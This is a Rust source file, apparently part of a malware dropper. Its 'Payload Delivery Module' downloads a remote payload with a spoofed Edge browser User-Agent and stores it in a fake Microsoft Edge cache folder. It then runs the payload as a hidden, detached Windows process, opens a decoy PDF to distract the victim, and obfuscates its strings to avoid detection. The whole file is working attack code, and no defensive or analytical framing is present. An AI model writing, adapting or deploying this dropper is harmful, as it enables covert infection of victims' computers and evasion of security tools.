//! Payload Delivery Module
//! 
//! This module handles downloading and executing the payload.
//! It uses legitimate-looking paths and process names to avoid detection.

use crate::config;
use obfstr::obfstr;
use std::env;
use std::fs::{self, File};
use std::io::Write;
use std::path::PathBuf;

#[cfg(target_os = "windows")]
use winapi::um::shellapi::ShellExecuteW;
#[cfg(target_os = "windows")]
use winapi::um::winuser::SW_HIDE;
#[cfg(target_os = "windows")]
use std::os::windows::ffi::OsStrExt;
#[cfg(target_os = "windows")]
use std::ffi::OsStr;
#[cfg(target_os = "windows")]
use std::ptr;

/// Execute the payload delivery process
pub fn execute_payload() -> Result<(), Box<dyn std::error::Error>> {
    // Step 1: Determine installation path (legitimate-looking directory)
    let install_path = get_install_path()?;
    
    // Step 2: Download the payload
    let payload_data = download_payload()?;
    
    // Step 3: Write payload to disk
    let payload_path = install_path.join(config::PAYLOAD_FILENAME);
    write_payload(&payload_path, &payload_data)?;
    
    // Step 4: Open decoy document (if configured)
    if config::OPEN_DECOY {
        let _ = open_decoy();
    }
    
    // Step 5: Execute the payload
    execute_file(&payload_path)?;
    
    Ok(())
}

/// Get a legitimate-looking installation path
fn get_install_path() -> Result<PathBuf, Box<dyn std::error::Error>> {
    // Use LocalAppData with a legitimate-looking path
    // Microsoft\Edge\User Data is a real directory that Edge creates
    
    let local_app_data = env::var(obfstr!("LOCALAPPDATA"))
        .or_else(|_| env::var(obfstr!("APPDATA")))?;
    
    // Create a path that looks like Microsoft Edge's update directory
    let path = PathBuf::from(&local_app_data)
        .join(obfstr!("Microsoft"))
        .join(obfstr!("Edge"))
        .join(obfstr!("User Data"))
        .join(obfstr!("Default"))
        .join(obfstr!("Cache"));
    
    // Create directory if it doesn't exist
    fs::create_dir_all(&path)?;
    
    Ok(path)
}

/// Download the payload from the configured URL
fn download_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Use ureq for simple HTTPS requests
    // The User-Agent header looks like a legitimate browser
    let response = ureq::get(config::PAYLOAD_URL)
        .set(obfstr!("User-Agent"), obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"))
        .call()?;
    
    // Read the response body
    let mut bytes = Vec::new();
    response.into_reader().read_to_end(&mut bytes)?;
    
    Ok(bytes)
}

/// Write the payload to disk
fn write_payload(path: &PathBuf, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::create(path)?;
    file.write_all(data)?;
    file.sync_all()?;
    
    Ok(())
}

/// Open a decoy document to make the dropper look legitimate
fn open_decoy() -> Result<(), Box<dyn std::error::Error>> {
    // Download decoy if it's a URL
    if config::DECOY_URL.starts_with("http") {
        let temp_dir = env::temp_dir();
        let decoy_path = temp_dir.join(obfstr!("Document.pdf"));
        
        // Download decoy
        let response = ureq::get(config::DECOY_URL)
            .set(obfstr!("User-Agent"), obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"))
            .call()?;
        
        let mut bytes = Vec::new();
        response.into_reader().read_to_end(&mut bytes)?;
        
        // Write decoy
        let mut file = File::create(&decoy_path)?;
        file.write_all(&bytes)?;
        
        // Open decoy
        #[cfg(target_os = "windows")]
        {
            open_with_shell(&decoy_path)?;
        }
    }
    
    Ok(())
}

/// Execute a file using CreateProcess or ShellExecute
#[cfg(target_os = "windows")]
fn execute_file(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION};
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
    use std::mem::zeroed;
    
    unsafe {
        // Convert path to wide string
        let path_wide: Vec<u16> = OsStr::new(path.to_str().unwrap_or(""))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        let mut startup_info: STARTUPINFOW = zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        
        let mut process_info: PROCESS_INFORMATION = zeroed();
        
        // Create process with no window, detached from parent
        let success = CreateProcessW(
            path_wide.as_ptr(),     // Application name
            ptr::null_mut(),         // Command line
            ptr::null_mut(),         // Process security attributes
            ptr::null_mut(),         // Thread security attributes
            0,                       // Don't inherit handles
            CREATE_NO_WINDOW | DETACHED_PROCESS,  // Creation flags
            ptr::null_mut(),         // Environment
            ptr::null_mut(),         // Current directory
            &mut startup_info,
            &mut process_info,
        );
        
        if success != 0 {
            // Close handles - we don't need to wait for the process
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
    }
    
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn execute_file(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    use std::process::Command;
    
    Command::new(path)
        .spawn()?;
    
    Ok(())
}

/// Open a file with the default application using ShellExecute
#[cfg(target_os = "windows")]
fn open_with_shell(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let path_wide: Vec<u16> = OsStr::new(path.to_str().unwrap_or(""))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        let operation: Vec<u16> = OsStr::new(obfstr!("open"))
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        ShellExecuteW(
            ptr::null_mut(),
            operation.as_ptr(),
            path_wide.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_HIDE,
        );
    }
    
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn open_with_shell(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    use std::process::Command;
    
    #[cfg(target_os = "macos")]
    {
        Command::new("open").arg(path).spawn()?;
    }
    
    #[cfg(target_os = "linux")]
    {
        Command::new("xdg-open").arg(path).spawn()?;
    }
    
    Ok(())
}
